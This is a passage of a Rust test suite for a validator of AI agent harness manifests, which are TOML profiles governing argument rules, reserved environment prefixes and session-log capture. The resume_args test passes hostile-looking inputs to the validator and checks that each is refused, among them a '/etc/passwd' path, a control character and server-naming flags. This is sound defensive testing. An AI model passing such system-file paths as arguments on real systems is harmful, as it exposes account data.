        std::time::Duration::from_secs(120)
    );
    let mut t = codex();
    set(&mut t, &["capture", "identity"], "wait_seconds", 300);
    let m = parsed(&t);
    assert_eq!(
        m.capture.identity.stdout_wait(),
        std::time::Duration::from_secs(300)
    );
    for bad in [0, 601] {
        let mut t = codex();
        set(&mut t, &["capture", "identity"], "wait_seconds", bad);
        refused(&t, PINNED, &["capture.identity.wait_seconds", "1 to 600"]);
    }
    let mut t = hermes();
    set(&mut t, &["capture", "identity"], "wait_seconds", 60);
    refused(
        &t,
        PINNED,
        &["capture.identity", "wait_seconds", "stdout_json"],
    );
}

/// A connector reserves its harness's own namespace as data (`reserved_env_prefixes`), so a
/// switch that would silently stop capture is refused without a harness name in the policy.
#[test]
fn a_connector_reserves_its_own_env_namespace_as_data() {
    for name in [
        "HERMES_SAFE_MODE",
        "HERMES_IGNORE_USER_CONFIG",
        "hermes_yolo_mode",
    ] {
        let mut t = hermes();
        set(&mut t, &["capture", "env"], name, "1");
        refused(
            &t,
            PINNED,
            &["capture.env", "HERMES_", "reserved_env_prefixes"],
        );
    }
    // Another connector is not bound by Hermes's reservation.
    let mut t = codex();
    set(&mut t, &["capture", "env"], "HERMES_SAFE_MODE", "1");
    admitted(&t, PINNED);
    // The prefix grammar.
    for bad in [
        "hermes_",
        "HERMES",
        "_X_",
        "A_B_C_D_E_F_G_H_I_J_K_L_M_N_O_P_Q_",
    ] {
        let mut t = hermes();
        set(
            &mut t,
            &["capture"],
            "reserved_env_prefixes",
            strings(&[bad]),
        );
        refused(&t, PINNED, &["capture.reserved_env_prefixes"]);
    }
}

// ---------------------------------------------------------------------------------------
// Chat mode (D57): the participant types the prompt; the session files are every one new or
// written since the run started
// ---------------------------------------------------------------------------------------

/// A chat-mode connector on a shared home: no goal slot, no credential, identity `none`, and a
/// native source read from the run's start.
fn chat() -> Table {
    r#"
schema_version = 1
id = "chat-cli"

[capture]
interactive = true
args = ["chat"]
resume_args = ["resume", "--last"]
continuation = "chat: the participant types the prompt and may type keep going"

[capture.executable]
program = "chat-agent"
version_args = ["--version"]

[capture.home]
run_home = "empty"
config_home = "shared"
env = "CHAT_HOME"
real_dirs = ["{user_home}/.chat"]
skills_dir = "skills"

[capture.ca]
env = ["NODE_EXTRA_CA_CERTS"]
mode = "extend"

[capture.identity]
source = "none"

[[capture.native]]
name = "session"
root = "{config_home}/sessions"
pattern = "*/*/*/rollout-*.jsonl"
form = "append_only"
since_run_start = true

[[capture.hosts]]
host = "api.chat.example"
evidence_paths = ["/v1/responses"]
"#
    .parse()
    .expect("TOML")
}

#[test]
fn an_interactive_profile_takes_no_goal_and_no_credential() {
    admitted(&chat(), PINNED);
    // `args` need not end in `--`, and may: the rule is lifted, not turned around.
    let mut t = chat();
    set(&mut t, &["capture"], "args", strings(&["chat", "--"]));
    admitted(&t, PINNED);
    // No goal flag: the participant types the prompt.
    let mut t = chat();
    set(&mut t, &["capture"], "goal_flag", "--prompt");
    refused(&t, PINNED, &["capture.goal_flag", "interactive"]);
    // No credential, even with the per-run home a credential otherwise needs.
    let t = with_credential(chat(), true);
    refused(&t, PINNED, &["capture.credential", "interactive"]);
    // Identity `none` only.
    let mut t = chat();
    let id = tbl(&mut t, &["capture", "identity"]);
    id.insert("source".into(), "preassigned".into());
    id.insert("binding".into(), "at_launch".into());
    refused(
        &t,
        PINNED,
        &["capture.identity.source", "interactive", "`none`"],
    );
    // Without `interactive` every headless rule holds again: the goal needs its one slot.
    let mut t = chat();
    set(&mut t, &["capture"], "interactive", false);
    refused(&t, PINNED, &["the goal is placed exactly one way"]);
    tbl(&mut t, &["capture"]).remove("interactive");
    refused(&t, PINNED, &["the goal is placed exactly one way"]);
    // `skills_dir` is a relative path under the config home.
    for bad in ["/skills", "../skills", "a//b", ".", "a/../b"] {
        let mut t = chat();
        set(&mut t, &["capture", "home"], "skills_dir", bad);
        refused(&t, PINNED, &["capture.home.skills_dir"]);
    }
    let mut t = chat();
    set(&mut t, &["capture", "home"], "skills_dir", ".agents/skills");
    admitted(&t, PINNED);
}

#[test]
fn none_on_a_shared_home_needs_since_run_start() {
    // Without it, an unscoped source on a shared home would read every other run's sessions.
    let mut t = chat();
    tbl(&mut t, &["capture", "native"]).remove("since_run_start");
    refused(
        &t,
        PINNED,
        &["capture.native.root", "must be per run", "since_run_start"],
    );
    set(&mut t, &["capture", "native"], "since_run_start", false);
    refused(&t, PINNED, &["must be per run", "since_run_start"]);
    set(&mut t, &["capture", "native"], "since_run_start", true);
    admitted(&t, PINNED);
    // The same holds for a headless profile with no session identity.
    let mut t = workload();
    set(&mut t, &["capture", "native"], "root", "{config_home}");
    refused(&t, DEV, &["must be per run", "since_run_start"]);
    set(&mut t, &["capture", "native"], "since_run_start", true);
    admitted(&t, DEV);
    // A per-run root needs no filter, and a scoped source may take one.
    let mut t = workload();
    set(&mut t, &["capture", "native"], "since_run_start", true);
    admitted(&t, DEV);
    let mut t = codex();
    set(&mut t, &["capture", "native"], "since_run_start", true);
    admitted(&t, PINNED);
}

#[test]
fn resume_args_follow_the_argv_rules() {
    // Optional, with or without `interactive`.
    let mut t = chat();
    tbl(&mut t, &["capture"]).remove("resume_args");
    admitted(&t, PINNED);
    let mut t = codex();
    set(
        &mut t,
        &["capture"],
        "resume_args",
        strings(&["resume", "--last"]),
    );
    admitted(&t, PINNED);
    // Each argument is held to the rules `args` is (D51).
    for (bad, needle) in [
        ("--url", "names a server"),
        ("--profile", "configuration profile"),
        ("/etc/passwd", "absolute path"),
        ("a\u{7}b", "control character"),
        ("{session_id}", "preassigned"),
        ("{nope}", "not a token here"),
        ("--tag=goalcup", "delivery-agnostic"),
    ] {
        let mut t = chat();
        set(
            &mut t,
            &["capture"],
            "resume_args",
            strings(&["resume", bad]),
        );
        refused(&t, PINNED, &["capture.resume_args", needle]);
    }
    // A substituted absolute path is the one relaxation, as for `args`.
    let mut t = chat();
    set(
        &mut t,
        &["capture"],
        "resume_args",
        strings(&["/work/state"]),
    );
    admitted(&t, DEV);
    // The argument guard applies to them too.
    let mut t = chat();
    set(
        &mut t,
        &["capture"],
        "argv_guard",
        Value::Table(
            [("long".to_string(), strings(&["help"]))]
                .into_iter()
                .collect(),
        ),
    );
    admitted(&t, PINNED);
    set(&mut t, &["capture"], "resume_args", strings(&["--help"]));
    refused(&t, PINNED, &["capture.resume_args", "before its parser"]);
    // Together with `args` they stay within the argument bound.
    let mut t = chat();
    let many: Vec<String> = (0..64).map(|n| format!("a{n}")).collect();
    let many: Vec<&str> = many.iter().map(String::as_str).collect();
    set(&mut t, &["capture"], "resume_args", strings(&many));
    refused(&t, PINNED, &["capture.resume_args", "64"]);
}

#[test]
fn an_interactive_profile_may_have_no_args() {
    // The harness opens its chat with no argument at all.
    let mut t = chat();
    set(&mut t, &["capture"], "args", strings(&[]));
    admitted(&t, PINNED);
    // `resume_args` still counts toward the one bound.
    let many: Vec<String> = (0..65).map(|n| format!("a{n}")).collect();
    let many: Vec<&str> = many.iter().map(String::as_str).collect();
    set(&mut t, &["capture"], "resume_args", strings(&many));
    refused(&t, PINNED, &["capture.resume_args", "64"]);
    // A headless profile still needs one argument.
    let mut t = codex();
    set(&mut t, &["capture"], "args", strings(&[]));
    refused(&t, PINNED, &["capture.args", "1 to 64"]);
}

/// Lane T's chat-mode connectors (D57), frozen as drafted: both pass the validator as pinned.
#[test]
fn the_chat_mode_connector_drafts_validate() {
    for id in ["codex-cli", "claude-code-cli"] {
        let text = fixture_text(&format!("{id}.chat-mode"));
        let m = HarnessManifest::from_toml_str(&text).unwrap_or_else(|e| panic!("{id}: {e}"));
        assert_eq!(m.id, id);
        m.validate(PINNED).unwrap_or_else(|e| panic!("{id}: {e}"));
        assert!(m.capture.interactive, "{id}");
        assert!(m.capture.native[0].since_run_start, "{id}");
        assert_eq!(m.capture.home.skills_dir.as_deref(), Some("skills"), "{id}");
    }
}
